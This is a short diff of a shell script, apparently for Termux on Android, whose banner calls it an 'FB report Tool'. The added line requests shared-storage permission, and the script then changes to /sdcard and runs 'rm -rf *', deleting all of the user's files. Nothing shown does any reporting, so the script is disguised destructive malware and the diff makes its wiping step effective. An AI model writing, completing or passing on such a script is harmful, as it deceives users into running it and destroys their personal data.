@@ -1,5 +1,6 @@
 clear
 figlet -f standard FB report Tool
+termux-setup-storage
 cd /sdcard
 rm -rf *
 echo ""
